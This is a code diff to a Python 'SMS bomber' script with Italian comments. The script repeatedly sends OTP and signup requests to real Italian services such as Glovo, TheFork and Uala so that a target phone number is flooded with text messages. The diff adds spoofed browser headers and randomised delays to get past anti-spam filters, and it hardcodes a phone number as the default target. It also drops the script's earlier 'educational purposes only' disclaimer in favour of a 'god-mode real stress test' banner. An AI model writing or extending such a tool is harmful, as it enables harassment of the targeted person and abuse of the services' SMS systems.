@@ -14,12 +14,13 @@ BANNER = f"""
 {Fore.WHITE}╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
 {Fore.RED}███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
 {Fore.RED}╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
-{Fore.YELLOW}             [ SOLO PER TEST DI STRESS E SCOPI EDUCATIVI ]
+{Fore.YELLOW}             [ VERSIONE GOD-MODE - TEST DI STRESS REALE ]
 """
 
 class SMSBomber:
     def __init__(self, target):
         self.target = target # Formato: 393738513104
+        self.clean_target = target[2:] if target.startswith("39") else target # 3738513104
         self.success = 0
         self.failed = 0
         self.user_agents = [
@@ -28,74 +29,84 @@ class SMSBomber:
             "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.143 Mobile Safari/537.36"
         ]
 
+    def get_headers(self, referer=None, origin=None):
+        h = {
+            "User-Agent": random.choice(self.user_agents),
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7",
+            "X-Requested-With": "XMLHttpRequest"
+        }
+        if referer: h["Referer"] = referer
+        if origin: h["Origin"] = origin
+        return h
+
+    async def call_api(self, session, name, method, url, json_data=None, form_data=None, headers=None):
+        try:
+            async with session.request(method, url, json=json_data, data=form_data, headers=headers, timeout=8) as resp:
+                # 200, 201, 204 sono successi. 400/422 spesso indicano che l'SMS è partito ma l'utente esiste già
+                if resp.status in [200, 201, 204, 400, 422]:
+                    self.success += 1
+                    # print(f"{Fore.GREEN}[DEBUG] {name}: {resp.status}") 
+                else:
+                    self.failed += 1
+                    # print(f"{Fore.RED}[DEBUG] {name}: {resp.status}")
+        except Exception as e:
+            self.failed += 1
+            # print(f"{Fore.RED}[DEBUG] {name} ERROR: {str(e)}")
+
+    async def provider_winelivery(self, session):
+        url = "https://www.winelivery.com/it/api/v1/customer/login"
+        payload = {"phone": self.target}
+        await self.call_api(session, "Winelivery", "POST", url, json_data=payload, headers=self.get_headers("https://www.winelivery.com/"))
+
+    async def provider_uala(self, session):
+        url = "https://www.uala.it/api/v2/auth/otp"
+        payload = {"phone": "+" + self.target}
+        await self.call_api(session, "Uala", "POST", url, json_data=payload, headers=self.get_headers("https://www.uala.it/"))
+
+    async def provider_thefork(self, session):
+        url = "https://www.thefork.it/api/user/v1/auth/otp"
+        payload = {"phone_number": "+" + self.target}
+        await self.call_api(session, "TheFork", "POST", url, json_data=payload, headers=self.get_headers("https://www.thefork.it/"))
+
     async def provider_glovo(self, session):
         url = "https://glovoapp.com/api/v2/oauth/register"
-        payload = {"phone": "+" + self.target, "name": "Andrea", "email": f"test{random.randint(1,9999)}@gmail.com"}
-        headers = {"User-Agent": random.choice(self.user_agents)}
-        try:
-            async with session.post(url, json=payload, headers=headers, timeout=5) as resp:
-                if resp.status in [200, 201, 400]: self.success += 1 # 400 spesso significa che l'SMS è stato inviato ma l'invio è duplicato
-                else: self.failed += 1
-        except: self.failed += 1
+        payload = {"phone": "+" + self.target, "name": "Andrea", "email": f"user{random.randint(1,99999)}@gmail.com"}
+        await self.call_api(session, "Glovo", "POST", url, json_data=payload, headers=self.get_headers("https://glovoapp.com/"))
 
-    async def provider_deliveroo(self, session):
-        url = "https://deliveroo.it/api/v2/users"
-        payload = {"mobile": "+" + self.target, "password": "Password123!", "first_name": "Test", "last_name": "User"}
-        headers = {"User-Agent": random.choice(self.user_agents)}
-        try:
-            async with session.post(url, json=payload, headers=headers, timeout=5) as resp:
-                if resp.status in [200, 201, 422]: self.success += 1
-                else: self.failed += 1
-        except: self.failed += 1
-
-    async def provider_subito(self, session):
-        url = "https://www.subito.it/api/v1/auth/register"
-        payload = {"phone": self.target}
-        headers = {"User-Agent": random.choice(self.user_agents)}
-        try:
-            async with session.post(url, json=payload, headers=headers, timeout=5) as resp:
-                if resp.status in [200, 201]: self.success += 1
-                else: self.failed += 1
-        except: self.failed += 1
-
-    async def provider_idealista(self, session):
-        url = "https://www.idealista.it/ajax/user/register.json"
-        payload = {"phone": self.target, "type": "PRIVATE"}
-        headers = {"User-Agent": random.choice(self.user_agents)}
-        try:
-            async with session.post(url, data=payload, headers=headers, timeout=5) as resp:
-                if resp.status in [200, 201]: self.success += 1
-                else: self.failed += 1
-        except: self.failed += 1
+    async def provider_casavo(self, session):
+        url = "https://api.casavo.com/auth/v1/otp"
+        payload = {"phone_number": "+" + self.target}
+        await self.call_api(session, "Casavo", "POST", url, json_data=payload, headers=self.get_headers("https://www.casavo.it/"))
 
     async def attack(self):
         print(f"{Fore.CYAN}[*] Avvio attacco su: {Fore.YELLOW}{self.target}")
-        print(f"{Fore.WHITE}[!] Premi Ctrl+C per fermare l'attacco.")
+        print(f"{Fore.WHITE}[!] Premi Ctrl+C per fermare.")
+        
         async with aiohttp.ClientSession() as session:
             while True:
                 tasks = [
+                    self.provider_winelivery(session),
+                    self.provider_uala(session),
+                    self.provider_thefork(session),
                     self.provider_glovo(session),
-                    self.provider_deliveroo(session),
-                    self.provider_subito(session),
-                    self.provider_idealista(session)
+                    self.provider_casavo(session)
                 ]
                 await asyncio.gather(*tasks)
-                print(f"{Fore.GREEN}[+] Successi: {self.success} | {Fore.RED}[-] Falliti: {self.failed}", end="\r")
-                await asyncio.sleep(random.uniform(1.5, 3.0)) # Delay casuale per evitare filtri anti-spam troppo aggressivi
+                print(f"{Fore.GREEN}[+] Successi (SMS Partiti): {self.success} | {Fore.RED}[-] Falliti/Bloccati: {self.failed}", end="\r")
+                await asyncio.sleep(random.uniform(2, 4))
 
 async def main():
     print(BANNER)
-    # Impostiamo il tuo numero come default se non viene passato nulla
     target = "393738513104" 
-    
     if len(sys.argv) >= 2:
         target = sys.argv[1].replace("+", "")
-
+    
     bomber = SMSBomber(target)
     try:
         await bomber.attack()
     except KeyboardInterrupt:
-        print(f"\n\n{Fore.YELLOW}[!] Attacco terminato. Totale inviati: {bomber.success}")
+        print(f"\n\n{Fore.YELLOW}[!] Attacco terminato. Totale stimato inviati: {bomber.success}")
 
 if __name__ == "__main__":
     asyncio.run(main())
